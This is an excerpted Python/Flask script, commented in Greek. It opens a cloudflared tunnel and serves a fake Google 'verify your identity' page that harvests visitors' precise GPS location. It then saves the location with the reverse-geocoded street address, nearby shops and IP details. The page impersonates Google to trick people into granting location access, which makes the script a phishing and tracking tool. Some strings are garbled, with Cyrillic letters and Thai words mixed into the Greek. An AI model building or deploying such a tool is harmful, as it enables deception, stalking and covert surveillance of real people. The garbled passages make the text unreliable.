...
# --- Εγκατάσταση Εξαρτήσεων και Δημιουργία Tunnel ---
...
def install_package(package):
    ...
    try:
        ...
        print(f"[ΣΦΑΛΜΑ] Αποτυχία εγκατάστασης του {package}: {e}", file=sys.stderr)
        sys.exit(1)

def check_dependencies():
    """Ελέγχει για το cloudflared και τα απαιτούμενα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑЛМА] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματός σας.", file=sys.stderr)
...
def run_cloudflared_and_print_link(port):
    """Ξεκινά ένα tunnel του cloudflared και εκτυπώνει μόνο τον δημόσιο σύνδεσμο."""
...
# --- Εισαγωγές για την εφαρμογή Flask (μετά τον έλεγχο εξαρτήσεων) ---
...
LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/Locations_GR') # Άλλαξε σε _GR για να μην υπάρχει σύγκρουση
os.makedirs(LOCATION_FOLDER, exist_ok=True)

logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)  # Καταστολή των logs τύπου INFO στο τερματικό

# --- ΒΟΗΘΗΤΙΚΕΣ ΣΥΝΑΡΤΗΣΕΙΣ & ΕΠΕΞΕΡΓΑΣΙΑ ΠΑΡΑΣΚΗΝΙΟΥ ---

geolocator = Nominatim(user_agent="fast_location_app_gr")

def process_and_save_location(data):
    """Διαδικασία παρασκηνίου: εμπλουτισμός και αποθήκευση δεδομένων τοποθεσίας, με καλή μορφοποίηση."""
    try:
        ...
        address_details = {}
        try:
            # Αλλαγή γλώσσας σε 'el' για ελληνικά αποτελέσματα
        ...
        # --- Κοντινά Καταστήματα (όριο 2) ---
        places = get_nearby_places(lat, lon, limit=2)

        # --- Πληροφορίες IP ---
        ip_info = get_ip_info()

        # --- Δημιουργία JSON φιλικού προς τον άνθρωπο ---
        pretty_data = {
            "Συντεταγμένες GPS": {
            ...
            "Διεύθυνση": {
                "Αριθμός Οδού": address_details.get("house_number"),
                "Οδός": address_details.get("road"),
                "Προάστιο": address_details.get("suburb"),
                "Πόλη": address_details.get("city") or address_details.get("town") or address_details.get("village"),
            ...
            "Κοντινά Μέρη (Κορυφαία 2)": [
                {
                    "Τύπος": p.get("type", "Άγνωστο").replace('_', ' ').title(),
                    "Όνομα": p.get("name", "Χωρίς Όνομα"),
                    "Διεύθυνση": p.get("address") or "Δ/Α",
                    "Απόσταση": f"{p['distance_m']} μ" if 'distance_m' in p else "Δ/Α"
                }
                for p in places
            ],
            "Τοποθεσία IP": {
        ...
        logger.error(f"Σφάλμα στην επεξεργασία παρασκηνίου: {e}")
...
def get_nearby_places(latitude, longitude, radius=2000, limit=2):
    """Επιστρέφει τα πλησιέστερα καταστήματα/παροχές με την απόστασή τους."""
    overpass_query = f"""
    [out:json];
    (
...
<div class="container">
    ...
    <h1>Επαληθεύστε την ταυτότητά σας</h1>
    <p>Για την ασφάλεια του λογαριασμού σας, η Google πρέπει να επιβεβαιώσει την τοποθεσία σας. Αυτό μας βοηθά να διασφαλίσουμε ότι είστε πραγματικά εσείς που συνδέεστε.</p>
...
<script>
    ...
    function requestLocation() {
        ...
        statusEl.textContent = 'Αίτηση για άδεια...';
        ...
        // Βήμα 1: Λήψη μιας γρήγορης, χαμηλής ακρίβειας θέσης πρώτα.
        navigator.geolocation.getCurrentPosition(
            (fastPosition) => {
                statusEl.style.color = '#1e8e3e';
                statusEl.textContent = 'Η τοποθεσία λήφθηκε. Ολοκλήρωση επαλήθευσης...';
                sendLocationToServer(fastPosition);

                // Βήμα 2: Τώρα προσπάθεια για λήψη μιας πιο ακριβούς θέσης.
                navigator.geolocation.getCurrentPosition(
                    (accuratePosition) => {
                        statusEl.textContent = 'Η επαλήθευση ολοκληρώθηκε. Σας ευχαριστούμε!';
                        sendLocationToServer(accuratePosition);
                    },
                    () => {
                        // Αυτό το μπλοκ εκτελείται αν η προσπάθεια υψηλής ακρίβειας αποτύχει.
                        // Η αρχική τοποθεσία έχει ήδη αποθηκευτεί, κάτι που είναι αρκετό.
                        statusEl.textContent = 'Η αρχική επαλήθευση ολοκληρώθηκε. Σας ευχαριστούμε!';
                    },
            ...
            (err) => {
                ...
                switch(err.code) {
                    case err.PERMISSION_DENIED:
                        message = "Άρνηση άδειας.";
                        break;
                    case err.POSITION_UNAVAILABLE:
                        message = "Οι πληροφορίες τοποθεσίας δεν είναι διαθέσιμες.";
                        break;
                    case err.TIMEOUT:
                        message = "Το αίτημα για λήψη τοποθεσίαςหมดหมดอายุ.";
                        break;
                    default:
                        message = "Προέκυψε άγνωστο σφάλμα.";
                        break;
                }
                statusEl.textContent = `Σφάλμα: ${message} Παρακαλώ ενεργοποιήστε τις υπηρεσίες τοποθεσίας.`;
                buttonEl.disabled = false;
            },
            // Επιλογές για την πρώτη, γρηγορότερη κλήση
...
def save_location():
    ...
    return jsonify({"message": "Τα δεδομένα τοποθεσίας λήφθηκαν."}), 202
